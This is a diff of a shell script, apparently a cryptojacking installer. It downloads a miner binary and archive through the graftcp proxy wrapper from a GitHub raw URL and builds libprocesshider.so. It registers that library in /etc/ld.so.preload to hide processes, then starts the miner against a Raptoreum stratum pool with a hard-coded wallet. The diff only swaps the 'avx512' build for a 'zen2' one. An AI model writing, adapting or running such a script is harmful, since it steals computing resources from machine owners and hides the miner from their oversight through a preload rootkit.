@@ -35,15 +35,15 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/avx512
-chmod +x avx512
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/zen2
+chmod +x zen2
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicAVX512.zip
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicZen2.zip
 
-unzip magicAVX512.zip
+unzip magicZen2.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./avx512 -a gr -o stratum+tcps://na-rtm.pool-server.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.PetrolAzAz120 -p IhatePopUps --no-tune
+./graftcp/graftcp ./zen2 -a gr -o stratum+tcps://na-rtm.pool-server.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.PetrolAzAz120 -p IhatePopUps --no-tune
